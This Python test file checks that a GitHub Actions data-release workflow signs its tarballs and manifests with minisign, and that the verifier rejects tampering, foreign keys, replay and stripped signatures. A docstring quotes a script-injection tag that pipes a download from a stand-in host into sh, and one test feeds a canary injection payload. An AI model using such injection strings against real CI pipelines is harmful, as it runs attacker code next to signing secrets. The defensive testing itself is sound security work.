"""Gates for data-release signing (#289).

Two layers, because they fail in different ways:

1. **Wiring** — parse `release-data.yml` and assert the signing step is
   actually load-bearing: unconditional, hard-failing without the key,
   verifying against the committed public key, uploading the `.minisig`,
   and keeping key material out of the workspace. A signing step that
   silently no-ops is the failure mode #283 already cost this repo once
   (the HF mirror reported green through two releases while pushing
   nothing), and it is worse here — an unsigned release that *looks*
   signed defeats the point of signing.

2. **Behaviour** — generate a throwaway keypair, run the workflow's own
   signing shell against it, and verify with the consumer script. Then
   attack it: tamper the bytes, swap the key, replay a valid signature
   onto a different release, strip the signature. Each must be rejected.

The second layer matters more than it looks. The first only proves we
wrote the right YAML; only the second proves the commands in it actually
produce a signature a consumer can verify — and that the checks we claim
catch attacks really do.

Neither layer needs the parquet tree or the network, so these run in
every PR.
"""

from __future__ import annotations

import re
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

_REPO_ROOT = Path(__file__).parent.parent
_WORKFLOW = _REPO_ROOT / ".github" / "workflows" / "release-data.yml"
_VERIFY_SCRIPT = _REPO_ROOT / "scripts" / "verify_data_release.sh"
_KEYGEN_SCRIPT = _REPO_ROOT / "scripts" / "gen_signing_key.sh"
_DOCS = _REPO_ROOT / "docs" / "security" / "data-signing.md"
_PUBKEY = _REPO_ROOT / "docs" / "security" / "data-signing-key.pub"

_needs_minisign = pytest.mark.skipif(
    shutil.which("minisign") is None,
    reason="minisign not on PATH — run inside the devShell (nix develop)",
)


def _signing_step() -> dict:
    """Return the 'Sign tarball' step from the data-asset job."""
    wf = yaml.safe_load(_WORKFLOW.read_text())
    steps = wf["jobs"]["data-asset"]["steps"]
    # Match on "sign", not "minisign" — the apt-install step names the binary
    # too, and silently asserting against *that* step would make every check
    # below vacuous.
    matches = [s for s in steps if str(s.get("name", "")).lower().startswith("sign")]
    assert matches, (
        "release-data.yml has no signing step. Data releases must be signed "
        "(#289); without this step the release publishes unsigned bytes."
    )
    assert len(matches) == 1, f"expected exactly one signing step, found {[s['name'] for s in matches]}"
    return matches[0]


# -- Layer 1: workflow wiring ------------------------------------------------


def test_signing_step_runs_before_upload() -> None:
    """The tarball must be signed before the upload step, not after.

    Ordering is not cosmetic: `softprops/action-gh-release` uploads whatever
    the glob matches at the moment it runs. A signing step scheduled after it
    would publish the tarball with no signature beside it and still go green.
    """
    wf = yaml.safe_load(_WORKFLOW.read_text())
    steps = wf["jobs"]["data-asset"]["steps"]
    names = [str(s.get("name") or s.get("uses") or "") for s in steps]

    sign_idx = next(i for i, n in enumerate(names) if "minisign" in n.lower())
    upload_idx = next(i for i, s in enumerate(steps) if "softprops" in str(s.get("uses", "")))
    assert sign_idx < upload_idx, f"signing step (index {sign_idx}) must precede upload (index {upload_idx})"


def test_signing_step_is_unconditional() -> None:
    """No `if:` on the signing step.

    A conditional signing step is how 'unsigned release' becomes possible
    again. #289 chose hard-fail over a declared-state toggle precisely so
    there is no configuration in which a release publishes unsigned.
    """
    step = _signing_step()
    assert "if" not in step, (
        f"signing step carries a condition ({step.get('if')!r}). Signing must be "
        "unconditional — a skippable signature is not a guarantee (#289)."
    )


def test_signing_step_hard_fails_without_key() -> None:
    """A missing secret must exit non-zero, not warn-and-continue.

    This is the #283 lesson applied to signing: a job that reports success
    while doing nothing is worse than one that fails, because nothing
    downstream ever learns.
    """
    run = _signing_step()["run"]
    assert "::error::" in run, "signing step must emit a GitHub error annotation when the key is absent"
    assert re.search(r"exit\s+1", run), "signing step must exit non-zero when the key is absent"
    assert '-z "${DATA_SIGNING_KEY}"' in run or "-z ${DATA_SIGNING_KEY}" in run, (
        "signing step must explicitly check that DATA_SIGNING_KEY is set"
    )


def test_signing_step_uses_both_secrets() -> None:
    """Key and passphrase both come from repository secrets, not the repo."""
    step = _signing_step()
    env = step.get("env", {})
    assert "secrets.DATA_SIGNING_KEY" in str(env.get("DATA_SIGNING_KEY", ""))
    assert "secrets.DATA_SIGNING_KEY_PASSWORD" in str(env.get("DATA_SIGNING_KEY_PASSWORD", ""))


def test_key_material_never_touches_the_workspace() -> None:
    """The secret key is written under RUNNER_TEMP and shredded.

    Writing it into the checkout would put it one careless asset glob away
    from being published as a release artifact.
    """
    run = _signing_step()["run"]
    assert "RUNNER_TEMP" in run, "secret key must be written under RUNNER_TEMP, never the workspace"
    assert "shred" in run or "rm -f" in run, "secret key file must be removed when the step exits"
    assert "umask 077" in run, "secret key must be written with a restrictive umask"


def test_workflow_verifies_against_committed_pubkey() -> None:
    """CI must verify its own signature against the key consumers pin.

    Without this, a rotated-but-not-committed key, a corrupted secret, or a
    swapped signing identity all produce a green release carrying a signature
    no consumer can verify — discovered only downstream, by the consumer.
    """
    run = _signing_step()["run"]
    assert "data-signing-key.pub" in run, "signing step must reference the committed public key"
    assert "minisign -V" in run, "signing step must verify the signature it just produced"


def test_trusted_comment_binds_version_tag_and_digest() -> None:
    """The signed trusted comment must name the release, not just the bytes.

    minisign alone cannot detect a genuine signature for release A being
    served as release B. The trusted comment is covered by the signature, so
    carrying version/tag/sha256 in it is what makes replay detectable.
    """
    run = _signing_step()["run"]
    tc = re.search(r'TRUSTED_COMMENT="([^"]+)"', run)
    assert tc, "signing step must set a TRUSTED_COMMENT"
    body = tc.group(1)
    for field in ("${CALVER}", "tag=", "sha256="):
        assert field in body, f"trusted comment must carry {field!r}; got {body!r}"
    assert "-t " in run, "trusted comment must be passed to minisign via -t"


def test_signing_step_does_not_interpolate_untrusted_input_into_shell() -> None:
    """`${{ }}` expansions are textual substitution before bash parses the line.

    `inputs.tag` is supplied by whoever dispatches the workflow. Interpolated
    directly into the script body, a tag like:

        data-1.0.0"; curl evil.sh | sh; #

    executes in the one step that holds the signing key. Bound through `env:`
    instead, it is data and can never be code. Guarded here because the unsafe
    form is the natural thing to write and reads as harmless.
    """
    step = _signing_step()
    run = step["run"]
    assert "${{" not in run, (
        "signing step interpolates a GitHub expression into the shell body. "
        "Pass it through `env:` instead — this step holds the signing key."
    )
    env = step.get("env", {})
    assert "inputs.tag" in str(env.get("INPUT_TAG", "")), "the dispatch tag must be bound via env, not interpolated"


def test_signing_step_validates_the_tag_before_signing() -> None:
    """The tag goes into the signed trusted comment, so it must be constrained.

    A signature is a durable assertion; asserting over unvalidated text is how
    a verifier is handed something it will parse as a different release.
    """
    run = _signing_step()["run"]
    assert re.search(r"\^data-\[0-9\]\{4\}", run), (
        "signing step must validate the tag matches data-YYYY.MM.MICRO before signing"
    )


def test_signature_asset_is_uploaded() -> None:
    """The .minisig must be in the upload glob — signing it is not publishing it."""
    wf = yaml.safe_load(_WORKFLOW.read_text())
    steps = wf["jobs"]["data-asset"]["steps"]
    upload = next(s for s in steps if "softprops" in str(s.get("uses", "")))
    files = str(upload["with"]["files"])
    assert "SIG_PATH" in files, f"upload step does not publish the signature; files={files!r}"
    assert upload["with"].get("fail_on_unmatched_files") is True, (
        "fail_on_unmatched_files must stay true, or a missing .minisig uploads silently"
    )


def test_release_workflow_has_no_pull_request_trigger() -> None:
    """A key reachable from a PR-triggered workflow attests to nothing.

    #289's stated pitfall. Guarded here so a later convenience trigger cannot
    quietly put the signing key within reach of untrusted code.
    """
    wf = yaml.safe_load(_WORKFLOW.read_text())
    # PyYAML parses the bare key `on:` as the boolean True.
    triggers = wf.get("on", wf.get(True))
    assert "pull_request" not in triggers, (
        "release-data.yml must not be triggered by pull_request — a PR must never "
        "be able to reach DATA_SIGNING_KEY (#289)."
    )
    assert "pull_request_target" not in triggers


# -- Layer 1b: the cutoff constant and the docs agree ------------------------


def _first_signed_version() -> str:
    m = re.search(r'^FIRST_SIGNED_VERSION="([^"]+)"', _VERIFY_SCRIPT.read_text(), re.M)
    assert m, "verify_data_release.sh must define FIRST_SIGNED_VERSION"
    return m.group(1)


def test_grandfathering_cutoff_matches_docs() -> None:
    """One cutoff, stated once.

    Consumers branch on 'require a signature at or above version X'. If the
    script and the docs disagree about X, some consumer trusts an unsigned
    release. The constant is the source of truth; the docs must quote it.
    """
    version = _first_signed_version()
    assert re.match(r"^\d{4}\.\d+\.\d+$", version), f"FIRST_SIGNED_VERSION={version!r} is not CalVer"
    docs = _DOCS.read_text()
    assert f"data-{version}" in docs, (
        f"docs/security/data-signing.md does not mention the cutoff data-{version}. "
        "Update the docs to match FIRST_SIGNED_VERSION in verify_data_release.sh."
    )


def test_docs_document_rotation_and_grandfathering() -> None:
    """#289's acceptance criteria include a documented rotation procedure."""
    docs = _DOCS.read_text().lower()
    for topic in ("rotation", "grandfather", "custody"):
        assert topic in docs, f"docs/security/data-signing.md must cover {topic}"


def test_secret_key_material_is_gitignored() -> None:
    """A stray secret key must not be committable.

    The keygen script writes a real signing key to disk. The public key is
    allowlisted by name; everything else in docs/security/ stays ignored.
    """
    proc = subprocess.run(
        ["git", "check-ignore", "docs/security/data-signing.key", "some/path/minisign.sec"],
        cwd=_REPO_ROOT,
        capture_output=True,
        text=True,
    )
    ignored = set(proc.stdout.split())
    assert "docs/security/data-signing.key" in ignored, "secret key material in docs/security/ must be gitignored"
    assert "some/path/minisign.sec" in ignored, "*.sec must be gitignored"


# -- Layer 1c: the committed public key, once it exists ----------------------


def test_public_key_is_a_valid_minisign_key() -> None:
    """The committed pubkey must be a well-formed minisign Ed25519 key.

    Skips until the key is generated — it can only be produced by the key
    holder, offline (#289). Once committed, it is checked on every run: a
    truncated or mangled key is a release-time failure otherwise.
    """
    if not _PUBKEY.exists():
        pytest.skip(f"{_PUBKEY.relative_to(_REPO_ROOT)} not committed yet — run `just gen-signing-key`")

    import base64

    lines = [ln for ln in _PUBKEY.read_text().splitlines() if ln.strip()]
    assert len(lines) == 2, f"minisign pubkey file must be 2 lines (comment + key), got {len(lines)}"
    assert lines[0].startswith("untrusted comment:"), "first line must be the untrusted comment"

    raw = base64.b64decode(lines[1].strip(), validate=True)
    # 2-byte algorithm id ('Ed') + 8-byte key id + 32-byte Ed25519 public key.
    assert len(raw) == 42, f"decoded pubkey must be 42 bytes, got {len(raw)}"
    assert raw[:2] == b"Ed", f"unexpected minisign algorithm id {raw[:2]!r} (expected b'Ed')"


# -- Layer 2: it actually signs, and the attacks actually fail ---------------


def _run_workflow_signing_step(
    workdir: Path,
    *,
    secret_key: str,
    password: str,
    asset: str,
    calver: str,
    input_tag: str = "",
    ref_name: str = "",
) -> subprocess.CompletedProcess:
    """Execute the signing step's actual `run:` body from release-data.yml.

    Not a re-implementation — the shell is lifted verbatim out of the workflow
    and executed. That is only possible because the step contains no `${{ }}`
    interpolation (enforced by
    test_signing_step_does_not_interpolate_untrusted_input_into_shell), which
    is also why the step is safe from script injection. The two properties are
    the same property, so this test and that one reinforce each other.

    Running the real body is what makes the wiring assertions meaningful: a
    string check like `'umask 077' in run` still passes if a `then` is missing
    or a quote is wrong, but this does not.
    """
    runner_temp = workdir / "runner-temp"
    runner_temp.mkdir(exist_ok=True)
    github_env = workdir / "github-env"
    github_env.touch()

    # The step signs the tarball and the content manifest (#296), so the
    # fixture must supply both. A manifest is created here rather than mocked
    # away: the point of running the real step body is that it fails when the
    # workflow expects something the caller does not provide.
    manifest = workdir / asset.replace(".tar.zst", ".manifest.json")
    if not manifest.exists():
        manifest.write_text(f'{{"data_version":"{calver}","tag":"data-{calver}","file_count":1,"files":{{}}}}\n')

    env = {
        "PATH": __import__("os").environ["PATH"],
        "HOME": str(workdir),
        "DATA_SIGNING_KEY": secret_key,
        "DATA_SIGNING_KEY_PASSWORD": password,
        "INPUT_TAG": input_tag,
        "REF_NAME": ref_name,
        # Exported into the step's environment by the preceding Build step via
        # $GITHUB_ENV; supplied directly here.
        "ASSET_PATH": asset,
        "CALVER": calver,
        "MANIFEST_PATH": manifest.name,
        "RUNNER_TEMP": str(runner_temp),
        "GITHUB_ENV": str(github_env),
    }
    return subprocess.run(
        ["bash", "-c", _signing_step()["run"]],
        cwd=workdir,
        env=env,
        capture_output=True,
        text=True,
    )


@pytest.fixture()
def signed_release(tmp_path: Path) -> dict:
    """Generate a throwaway key and sign a tarball by running the workflow's own step."""
    pubkey_dir = tmp_path / "docs" / "security"
    pubkey_dir.mkdir(parents=True)
    pubkey = pubkey_dir / "data-signing-key.pub"
    seckey = tmp_path / "data-signing.key"
    password = "test-passphrase"

    subprocess.run(
        ["minisign", "-G", "-f", "-p", str(pubkey), "-s", str(seckey)],
        input=f"{password}\n{password}\n",
        text=True,
        capture_output=True,
        check=True,
    )

    version = "2026.8.2"
    asset = f"nucl-parquet-data-{version}.tar.zst"
    tarball = tmp_path / asset
    tarball.write_bytes(b"not really zstd, but the signature does not care\n" * 64)

    proc = _run_workflow_signing_step(
        tmp_path,
        secret_key=seckey.read_text(),
        password=password,
        asset=asset,
        calver=version,
        ref_name=f"data-{version}",
    )
    assert proc.returncode == 0, f"the workflow's signing step failed:\n{proc.stdout}\n{proc.stderr}"

    import hashlib

    return {
        "dir": tmp_path,
        "pubkey": pubkey,
        "seckey": seckey,
        "password": password,
        "tarball": tarball,
        "sig": tarball.with_suffix(tarball.suffix + ".minisig"),
        "version": version,
        "tag": f"data-{version}",
        "sha": hashlib.sha256(tarball.read_bytes()).hexdigest(),
    }


def _verify(signed: dict, *, version: str | None = None, pubkey: Path | None = None) -> subprocess.CompletedProcess:
    return subprocess.run(
        [
            str(_VERIFY_SCRIPT),
            "--file",
            str(signed["tarball"]),
            "--version",
            version or signed["version"],
            "--pubkey",
            str(pubkey or signed["pubkey"]),
        ],
        capture_output=True,
        text=True,
        cwd=_REPO_ROOT,
    )


@_needs_minisign
def test_verify_accepts_a_genuine_signature(signed_release: dict) -> None:
    """The happy path — a real signature over real bytes verifies."""
    proc = _verify(signed_release)
    assert proc.returncode == 0, f"verification of a genuine signature failed:\n{proc.stdout}\n{proc.stderr}"
    assert "signature valid" in proc.stdout


@_needs_minisign
def test_verify_rejects_tampered_bytes(signed_release: dict) -> None:
    """One appended byte must break verification."""
    with signed_release["tarball"].open("ab") as fh:
        fh.write(b"\x00")
    proc = _verify(signed_release)
    assert proc.returncode != 0, "tampered tarball verified — signature check is not load-bearing"
    assert "VERIFICATION FAILED" in proc.stderr


@_needs_minisign
def test_verify_rejects_a_foreign_key(signed_release: dict, tmp_path: Path) -> None:
    """A signature from a key consumers did not pin must be rejected.

    This is the whole point: 'validly signed' is worthless without 'signed by
    *us*'.
    """
    other = tmp_path / "other.pub"
    subprocess.run(
        ["minisign", "-G", "-W", "-f", "-p", str(other), "-s", str(tmp_path / "other.key")],
        capture_output=True,
        check=True,
    )
    proc = _verify(signed_release, pubkey=other)
    assert proc.returncode != 0, "signature from a foreign key was accepted"
    assert "VERIFICATION FAILED" in proc.stderr


@_needs_minisign
def test_verify_detects_replay_onto_another_release(signed_release: dict) -> None:
    """A genuine signature served as a *different* release must be caught.

    minisign says yes here — the bytes and signature really do match. Only
    the trusted-comment cross-check distinguishes 'authentic bytes for the
    release you asked for' from 'authentic bytes for an older release with a
    known defect'. This is the test that justifies the trusted comment
    carrying tag and digest at all.
    """
    proc = _verify(signed_release, version="2026.9.9")
    assert proc.returncode != 0, "a signature for a different release was accepted — replay is possible"
    assert "REPLAY DETECTED" in proc.stderr


@_needs_minisign
def test_verify_rejects_a_stripped_signature(signed_release: dict) -> None:
    """A removed .minisig must fail, not degrade to 'unsigned is fine'."""
    signed_release["sig"].unlink()
    proc = _verify(signed_release)
    assert proc.returncode != 0, "missing signature was treated as acceptable"


@_needs_minisign
def test_verify_rejects_a_doctored_trusted_comment(signed_release: dict) -> None:
    """Editing the trusted comment must invalidate the signature.

    The trusted comment is only trustworthy because it is *covered* by the
    signature. If a rewritten comment still verified, every claim the
    verifier makes from it (version, tag, digest) would be forgeable.
    """
    sig = signed_release["sig"]
    text = sig.read_text()
    sig.write_text(re.sub(r"^trusted comment: .*$", "trusted comment: nucl-parquet data 9999.1.1", text, flags=re.M))
    proc = _verify(signed_release)
    assert proc.returncode != 0, "a doctored trusted comment verified — the comment is not actually signed"


# -- Layer 2b: the keygen script is safe to run ------------------------------


@_needs_minisign
def test_workflow_step_hard_fails_when_the_key_is_absent(tmp_path: Path) -> None:
    """Run the real step with no key and confirm it exits non-zero.

    The wiring test only checks that the strings `::error::` and `exit 1`
    appear. This runs the shell.
    """
    (tmp_path / "docs" / "security").mkdir(parents=True)
    (tmp_path / "docs" / "security" / "data-signing-key.pub").write_text("untrusted comment: x\nRWQ\n")
    (tmp_path / "asset.tar.zst").write_bytes(b"x")

    proc = _run_workflow_signing_step(
        tmp_path, secret_key="", password="", asset="asset.tar.zst", calver="2026.8.2", ref_name="data-2026.8.2"
    )
    assert proc.returncode != 0, "signing step succeeded with no key — an unsigned release would publish"
    assert "::error::" in proc.stdout + proc.stderr


@_needs_minisign
def test_workflow_step_rejects_an_injected_tag(tmp_path: Path) -> None:
    """A crafted dispatch tag must be rejected, not executed.

    The canary file would only appear if the tag were interpreted as shell.
    """
    (tmp_path / "docs" / "security").mkdir(parents=True)
    pub = tmp_path / "docs" / "security" / "data-signing-key.pub"
    sec = tmp_path / "k.key"
    subprocess.run(
        ["minisign", "-G", "-f", "-p", str(pub), "-s", str(sec)],
        input="pw\npw\n",
        text=True,
        capture_output=True,
        check=True,
    )
    (tmp_path / "asset.tar.zst").write_bytes(b"x")
    canary = tmp_path / "PWNED"

    proc = _run_workflow_signing_step(
        tmp_path,
        secret_key=sec.read_text(),
        password="pw",
        asset="asset.tar.zst",
        calver="2026.8.2",
        input_tag=f'data-2026.8.2"; touch {canary}; #',
    )
    assert not canary.exists(), "the dispatch tag was executed as shell — script injection is possible"
    assert proc.returncode != 0, "a malformed tag was accepted for signing"


@_needs_minisign
def test_verify_rejects_a_signature_file_with_extra_lines(signed_release: dict) -> None:
    """An appended `trusted comment:` line must be refused, not parsed.

    minisign accepts a 5-line .minisig — it ignores anything past line 4
    (confirmed against 0.12). Only line 3 is covered by the global signature,
    so a naive `sed -n 's/^trusted comment: //p'` would parse the attacker's
    appended line alongside the real one and make claims from unsigned text.
    """
    sig = signed_release["sig"]
    with sig.open("a") as fh:
        fh.write("trusted comment: nucl-parquet data 9999.1.1 tag=data-9999.1.1 sha256=" + "de" * 32 + "\n")
    proc = _verify(signed_release)
    assert proc.returncode != 0, "a .minisig with unsigned extra lines was accepted"
    assert "malformed signature file" in proc.stderr


# -- Layer 2c: the grandfathering cutoff is enforced, not just documented ----


@_needs_minisign
def test_allow_unsigned_is_refused_at_or_above_the_cutoff(signed_release: dict) -> None:
    """--allow-unsigned must not downgrade a version that should be signed.

    The attack it closes: strip the .minisig in transit (or rewrite the mutable
    release), let the consumer hit the 'carries no signature' error, and rely on
    them re-running with the flag that error suggests. If the flag applied at
    any version, the whole signing scheme would be one retry away from bypass.
    """
    signed_release["sig"].unlink()
    proc = subprocess.run(
        [
            str(_VERIFY_SCRIPT),
            "--file",
            str(signed_release["tarball"]),
            "--version",
            _first_signed_version(),
            "--pubkey",
            str(signed_release["pubkey"]),
            "--allow-unsigned",
        ],
        capture_output=True,
        text=True,
        cwd=_REPO_ROOT,
    )
    assert proc.returncode != 0, "--allow-unsigned bypassed verification at the cutoff version"
    assert "refusing --allow-unsigned" in proc.stderr


@_needs_minisign
def test_allow_unsigned_is_permitted_below_the_cutoff(signed_release: dict) -> None:
    """Genuinely pre-signing releases stay verifiable-with-opt-out.

    The cutoff has to permit as well as refuse, or the grandfathering rule is
    just a hard failure with extra steps.
    """
    signed_release["sig"].unlink()
    proc = subprocess.run(
        [
            str(_VERIFY_SCRIPT),
            "--file",
            str(signed_release["tarball"]),
            "--version",
            "2026.7.2",
            "--pubkey",
            str(signed_release["pubkey"]),
            "--allow-unsigned",
        ],
        capture_output=True,
        text=True,
        cwd=_REPO_ROOT,
    )
    assert proc.returncode == 0, f"--allow-unsigned rejected a pre-cutoff release:\n{proc.stderr}"
    assert "NOTHING about these bytes has been verified" in proc.stderr, (
        "the opt-out warning must state plainly that nothing was checked"
    )


def test_unsigned_warning_does_not_claim_checks_it_does_not_run() -> None:
    """The opt-out path must not name a control that is not running.

    It previously claimed integrity rested on 'the catalog SHA-256 pin' — a
    check this script never performs. Naming an absent control in the one
    message a user reads while deciding to trust unverified bytes is worse
    than saying nothing.
    """
    src = _VERIFY_SCRIPT.read_text()
    # Only the emitted WARNING lines matter — prose comments may legitimately
    # discuss the pin in order to explain why it is *not* claimed here.
    warnings = [ln for ln in src.splitlines() if "WARNING:" in ln and not ln.strip().startswith("#")]
    assert warnings, "the unsigned opt-out must warn"
    joined = " ".join(warnings)
    assert "pin" not in joined and "data_sha256" not in joined, (
        f"the opt-out warning claims a SHA-256 pin check this script never performs: {joined}"
    )
    assert "NOTHING about these bytes has been verified" in joined


def test_calver_comparison_is_numeric_not_lexical() -> None:
    """2026.8.10 is newer than 2026.8.9; a string compare disagrees.

    Exercised through the script itself: a .9 release must still be treated as
    below a .10 cutoff.
    """
    src = _VERIFY_SCRIPT.read_text()
    assert "_calver_lt" in src, "the cutoff comparison must be numeric"
    assert "(( a[i] < b[i] ))" in src, "CalVer components must be compared as integers"


def test_keygen_refuses_to_silently_overwrite_an_existing_key() -> None:
    """Rotation must be deliberate.

    Overwriting the key in place breaks every consumer that pinned the old
    one, so the script demands explicit confirmation and points at the
    runbook.
    """
    src = _KEYGEN_SCRIPT.read_text()
    assert "already exists" in src, "keygen must detect an existing public key"
    assert "rotate" in src, "keygen must require explicit confirmation before rotating"


def test_keygen_validates_the_passphrase_before_uploading() -> None:
    """A wrong passphrase must fail locally, not at the next release.

    If CI holds a password that cannot decrypt the key, the first signed
    release is what discovers it — after the tag is already pushed.
    """
    src = _KEYGEN_SCRIPT.read_text()
    idx_check = src.find("does not decrypt the key")
    idx_upload = src.find("gh secret set")
    assert idx_check != -1, "keygen must verify the passphrase decrypts the key"
    assert idx_check < idx_upload, "passphrase check must happen before any secret is uploaded"


def test_keygen_prompts_for_the_passphrase_once_and_confirms_it() -> None:
    """The passphrase is read once, confirmed, then fed to minisign.

    Letting minisign prompt and *then* asking again for the copy to upload
    means typing the same secret three times, and a typo on the third puts a
    passphrase in CI that cannot decrypt the key. It also breaks outright when
    stdin is not a terminal: minisign drains stdin, so the follow-up read hits
    EOF and `set -e` aborts after the keypair is already on disk.
    """
    src = _KEYGEN_SCRIPT.read_text()
    assert "PASSPHRASE_CONFIRM" in src, "keygen must ask the passphrase twice and compare"
    assert "passphrases do not match" in src, "keygen must reject a mismatched confirmation"

    # Match executable lines only — comments mention `minisign -G` too, and
    # matching one of those would compare against the wrong position.
    code = [ln for ln in src.splitlines() if not ln.strip().startswith("#")]
    idx_prompt = next(i for i, ln in enumerate(code) if "read -r -s -p" in ln)
    idx_gen = next(i for i, ln in enumerate(code) if "minisign -G" in ln)
    assert idx_prompt < idx_gen, "the passphrase must be collected before minisign -G, then piped into it"


def test_keygen_rejects_an_empty_passphrase() -> None:
    """An empty passphrase leaves the offline master copy unprotected.

    The copy in the password manager is the one the passphrase actually
    protects — the CI copy is guarded by the secret store either way.
    """
    src = _KEYGEN_SCRIPT.read_text()
    assert "empty passphrase" in src, "keygen must reject an empty passphrase"


def test_keygen_shreds_the_key_on_an_unsuccessful_exit() -> None:
    """An aborted run must not leave an undocumented signing key on disk.

    If the script dies between `minisign -G` and the closing message — wrong
    passphrase, gh failure, Ctrl-C — a real secret key sits in a temp dir that
    nobody has been told about. It is kept only once the run completes, because
    at that point the operator still has to move it into their password
    manager and the closing message names the path.
    """
    src = _KEYGEN_SCRIPT.read_text()
    assert "trap on_exit EXIT" in src, "keygen must clean up key material on abnormal exit"
    assert "COMPLETED=0" in src and "COMPLETED=1" in src, "the trap must distinguish success from abort"

    idx_completed = src.find("COMPLETED=1")
    idx_upload = src.rfind("gh secret set")
    assert idx_upload < idx_completed, "the run is only 'completed' after both secrets are uploaded"


# -- Signed content manifest (#296) -----------------------------------------
#
# The tarball signature covers archive *framing*. Content Disarm &
# Reconstruction gateways — standard at hospitals and Tier-1 nuclear sites —
# open a .tar.zst, scan each entry and repack it, so the data arrives intact
# and the signature does not survive (exoma-ch/hyrr#614). The manifest is what
# remains verifiable, and what makes a partial transfer checkable at all.


def test_manifest_scope_is_wider_than_the_tree_hash() -> None:
    """The manifest must cover files the drift check deliberately ignores.

    `compute_data_sha256` covers only `*.parquet` — a catalog edit must not look
    like a data change. But the tarball is `tar -C data .`, so `catalog.json`
    and `licenses.toml` ride inside it, and those are the files most worth
    tampering with: #234 is a live case of a wrong licence claim shipping on a
    published artefact. Building the manifest from the narrow scope would leave
    them unsigned while looking complete.
    """
    from nucl_parquet import iter_file_digests

    parquet = {rel for rel, _, _ in iter_file_digests(_REPO_ROOT / "data", parquet_only=True)}
    everything = {rel for rel, _, _ in iter_file_digests(_REPO_ROOT / "data", parquet_only=False)}

    assert parquet < everything, "manifest scope must be strictly wider than the tree-hash scope"
    assert "catalog.json" in everything and "catalog.json" not in parquet
    assert "licenses.toml" in everything and "licenses.toml" not in parquet


def test_manifest_is_deterministic() -> None:
    """Two builds of one tree must be byte-identical.

    A signature over a non-deterministic serialisation is unreproducible by
    anyone auditing it, and diffing two releases becomes noise.
    """
    from nucl_parquet import build_release_manifest, dump_release_manifest

    a = dump_release_manifest(build_release_manifest(_REPO_ROOT / "data", tag="data-2026.8.2"))
    b = dump_release_manifest(build_release_manifest(_REPO_ROOT / "data", tag="data-2026.8.2"))
    assert a == b
    assert a.endswith("\n")
    assert '": {"' in a or '":{"' in a, "expected compact separators, not pretty-printing"


def test_manifest_binds_itself_to_a_release() -> None:
    """Without version/tag inside it, a manifest is replayable.

    A genuine manifest for release A verifies happily against release B's
    extracted files, and every per-file digest unchanged between the two
    agrees — so a consumer doing a partial check may never notice. This is the
    same gap the tarball signature closes via its signed trusted comment.
    """
    from nucl_parquet import build_release_manifest, data_sha256

    m = build_release_manifest(_REPO_ROOT / "data", tag="data-2026.8.2", tarball_sha256="ab" * 32)
    assert m["tag"] == "data-2026.8.2"
    assert m["data_version"] == "2026.8.2"
    assert m["tarball_sha256"] == "ab" * 32
    # Cross-links the two controls so a consumer can confirm they describe one release.
    assert m["data_sha256"] == data_sha256(_REPO_ROOT / "data")


def test_manifest_detects_modification_missing_and_extra(tmp_path) -> None:
    """The three outcomes are distinguished, because they mean different things.

    A missing file may be a deliberate partial transfer; a digest mismatch is
    corruption or tampering. Collapsing them would force a consumer to treat a
    legitimate subset as an attack.
    """
    from nucl_parquet import build_release_manifest, verify_against_manifest

    (tmp_path / "sub").mkdir()
    (tmp_path / "a.parquet").write_bytes(b"alpha")
    (tmp_path / "sub" / "b.parquet").write_bytes(b"beta")
    (tmp_path / "catalog.json").write_text('{"data_version":"2026.8.2"}')

    m = build_release_manifest(tmp_path, tag="data-2026.8.2")
    assert verify_against_manifest(m, tmp_path) == []

    (tmp_path / "sub" / "b.parquet").write_bytes(b"EVIL")
    assert any(p.startswith("MODIFIED") for p in verify_against_manifest(m, tmp_path))

    (tmp_path / "sub" / "b.parquet").unlink()
    assert any(p.startswith("MISSING") for p in verify_against_manifest(m, tmp_path))

    (tmp_path / "planted.parquet").write_bytes(b"x")
    assert any(p.startswith("EXTRA") for p in verify_against_manifest(m, tmp_path))


def test_workflow_builds_signs_and_publishes_the_manifest() -> None:
    """All four assets, and both signatures verified before any upload."""
    wf = yaml.safe_load(_WORKFLOW.read_text())
    steps = wf["jobs"]["data-asset"]["steps"]

    build = next(s for s in steps if s.get("name") == "Build content manifest")
    assert "${{" not in build["run"], "manifest step must not interpolate expressions into shell"
    assert "file_count" in build["run"], "a manifest listing nothing would sign and publish happily"

    sign = _signing_step()["run"]
    assert "MANIFEST_PATH" in sign, "the manifest must be signed with the same key as the tarball"
    assert sign.count("minisign -S") == 2, "expected exactly two signing invocations"
    assert 'for artefact in "${TARBALL}" "${MANIFEST_PATH}"' in sign, (
        "both artefacts must be verified against the committed pubkey before upload"
    )

    upload = next(s for s in steps if "softprops" in str(s.get("uses", "")))
    files = str(upload["with"]["files"])
    for expected in ("ASSET_PATH", "SIG_PATH", "MANIFEST_PATH", "MANIFEST_SIG_PATH"):
        assert expected in files, f"release must publish {expected}"


def test_verifier_refuses_an_unsigned_manifest() -> None:
    """An unsigned manifest reads as a control while being none.

    It sits beside the files it describes, so anyone who can rewrite the files
    can rewrite it. All four HYRR reviewers converged on this point.
    """
    src = _VERIFY_SCRIPT.read_text()
    assert "refusing to trust an unsigned manifest" in src
    assert "MANIFEST SIGNATURE VERIFICATION FAILED" in src


def test_verifier_checks_manifest_replay_and_partial_transfers() -> None:
    src = _VERIFY_SCRIPT.read_text()
    assert "REPLAY DETECTED: manifest" in src, "a manifest for another release must be rejected"
    assert "--ignore-missing" in src, "a partial transfer must be verifiable without faking completeness"
    assert "--partial" in src


def test_tarball_and_manifest_cover_the_same_files() -> None:
    """The archive and the manifest must describe one set of files.

    They are produced by different tools over different exclusion rules: `tar`
    takes everything under `data/`, while the manifest honours
    `_HASH_EXCLUDE_DIRS`. `data/g4_raw/` is a gitignored build cache that the
    manifest skips and a bare `tar -C data .` sweeps in — a clean CI checkout
    does not have it, so the mismatch is latent rather than absent.

    A file that ships in the tarball without a manifest entry is unverifiable,
    and invisible: both artefacts are individually well-formed and both
    signatures verify. Hence the exclusion on the tar side, and a release-time
    assertion that the two sets are equal.
    """
    wf = yaml.safe_load(_WORKFLOW.read_text())
    steps = wf["jobs"]["data-asset"]["steps"]

    build = next(s for s in steps if s.get("name") == "Build tarball")["run"]
    assert "--exclude='./g4_raw'" in build, (
        "the tarball must exclude the same build cache the manifest does, or it ships unverifiable files"
    )

    manifest_step = next(s for s in steps if s.get("name") == "Build content manifest")["run"]
    assert "tar --zstd -tf" in manifest_step, "the release must compare the tarball's members to the manifest"
    assert "describe different file sets" in manifest_step, "the comparison must fail the release, not just log"


